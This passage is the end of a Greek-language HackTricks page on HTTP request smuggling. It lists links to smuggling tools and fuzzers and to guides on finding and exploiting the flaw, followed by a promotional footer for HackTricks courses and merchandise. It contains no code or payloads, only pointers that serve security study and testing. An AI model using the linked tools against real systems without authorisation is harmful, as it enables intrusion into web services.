* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Αυτό το εργαλείο είναι ένας γραμματικής βασισμένος HTTP Fuzzer που είναι χρήσιμος για την εύρεση παρατηρήσεων στις αιτήσεις.

## Αναφορές

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
